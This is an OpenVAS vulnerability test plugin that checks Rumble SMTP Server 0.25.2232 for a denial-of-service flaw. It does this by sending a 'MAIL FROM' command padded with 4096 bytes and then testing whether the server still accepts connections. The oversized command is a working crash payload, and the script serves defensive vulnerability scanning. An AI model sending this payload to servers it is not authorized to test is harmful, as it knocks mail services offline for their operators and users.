###############################################################################
# OpenVAS Vulnerability Test
#
# Rumble SMTP Server 'MAIL FROM' Command Denial of Service Vulnerability
#
# Authors:
# Veerendra G.G
#
# Copyright:
# Copyright (C) 2011 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.802012");
  script_version("2022-04-28T13:38:57+0000");
  script_tag(name:"last_modification", value:"2022-04-28 13:38:57 +0000 (Thu, 28 Apr 2022)");
  script_tag(name:"creation_date", value:"2011-04-11 14:40:00 +0200 (Mon, 11 Apr 2011)");
  script_tag(name:"cvss_base", value:"8.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:S/C:C/I:C/A:C");
  script_name("Rumble SMTP Server 'MAIL FROM' Command Denial of Service Vulnerability");
  script_category(ACT_DENIAL);
  script_copyright("Copyright (C) 2011 Greenbone Networks GmbH");
  script_family("Denial of Service");
  script_dependencies("smtpserver_detect.nasl");
  script_require_ports("Services/smtp", 25);
  script_mandatory_keys("smtp/esmtpsa/detected");

  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/17070/");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/47070");
  script_xref(name:"URL", value:"http://packetstormsecurity.org/files/view/99827/");

  script_tag(name:"impact", value:"Successful exploitation may allow remote attackers to cause the
  application to crash.");

  script_tag(name:"affected", value:"Rumble SMTP Server Version 0.25.2232. Other versions may also
  be affected.");

  script_tag(name:"insight", value:"The flaw is due to an error while handling 'MAIL FROM' command,
  which can be exploited by remote attackers to crash an affected application by
  sending specially crafted 'MAIL FROM' command.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one.");

  script_tag(name:"summary", value:"Rumble SMTP Server is prone to a denial of service vulnerability.");

  script_tag(name:"qod_type", value:"remote_analysis");
  script_tag(name:"solution_type", value:"WillNotFix");

  exit(0);
}

include("smtp_func.inc");
include("misc_func.inc");
include("port_service_func.inc");

port = smtp_get_port(default:25);
banner = smtp_get_banner(port:port);
if(!banner || "ESMTPSA" >!< banner)
  exit(0);

soc1 = smtp_open(port:port, data:"mydomain.tld");
if(!soc1)
  exit(0);

crafted_data = 'MAIL FROM ' + crap(data:'A',length:4096) + string("\r\n");
send(socket:soc1, data:crafted_data);
recv(socket:soc1, length:1024);

sleep(3);

soc2 = smtp_open(port:port, data:"mydomain.tld");
if(!soc2) {
  close(soc1);
  security_message(port:port);
  exit(0);
}

smtp_close(socket:soc1, check_data:FALSE);
smtp_close(socket:soc2, check_data:FALSE);
exit(99);
